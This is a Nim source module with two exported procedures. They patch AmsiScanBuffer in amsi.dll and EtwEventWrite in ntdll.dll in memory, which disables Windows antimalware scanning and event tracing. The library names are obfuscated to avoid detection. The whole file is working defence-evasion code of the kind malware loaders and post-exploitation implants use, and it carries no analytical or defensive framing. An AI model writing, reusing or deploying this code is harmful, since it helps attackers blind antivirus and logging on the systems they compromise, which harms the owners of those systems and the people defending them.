import winim/lean
import strenc

# Patch AMSI by overwriting AmsiScanBuffer
# Returns: 0=success, 1=error, 2=already patched
proc patchAMSI*(): int =
  try:
    let amsi = LoadLibraryA(obf("amsi.dll"))
    if amsi == 0:
      return 1
    
    let amsiScanBuffer = GetProcAddress(amsi, obf("AmsiScanBuffer"))
    if amsiScanBuffer == nil:
      return 1
    
    # Check if already patched
    let firstBytes = cast[ptr array[3, byte]](amsiScanBuffer)
    if firstBytes[][0] == 0x48 and firstBytes[][1] == 0x31 and firstBytes[][2] == 0xc0:
      return 2  # Already patched
    
    # Patch: xor rax, rax; ret (48 31 C0 C3)
    var oldProtect: DWORD
    if VirtualProtect(amsiScanBuffer, 4, PAGE_EXECUTE_READWRITE, addr oldProtect) == 0:
      return 1
    
    let patch = cast[ptr array[4, byte]](amsiScanBuffer)
    patch[][0] = 0x48
    patch[][1] = 0x31
    patch[][2] = 0xc0
    patch[][3] = 0xc3
    
    var temp: DWORD
    discard VirtualProtect(amsiScanBuffer, 4, oldProtect, addr temp)
    
    return 0  # Success
  except:
    return 1

# Patch ETW by overwriting EtwEventWrite
# Returns: 0=success, 1=error, 2=already patched
proc patchETW*(): int =
  try:
    let ntdll = LoadLibraryA(obf("ntdll.dll"))
    if ntdll == 0:
      return 1
    
    let etwEventWrite = GetProcAddress(ntdll, obf("EtwEventWrite"))
    if etwEventWrite == nil:
      return 1
    
    # Check if already patched
    let firstBytes = cast[ptr array[1, byte]](etwEventWrite)
    if firstBytes[][0] == 0xc3:
      return 2  # Already patched
    
    # Patch: ret (C3)
    var oldProtect: DWORD
    if VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, addr oldProtect) == 0:
      return 1
    
    let patch = cast[ptr byte](etwEventWrite)
    patch[] = 0xc3
    
    var temp: DWORD
    discard VirtualProtect(etwEventWrite, 1, oldProtect, addr temp)
    
    return 0  # Success
  except:
    return 1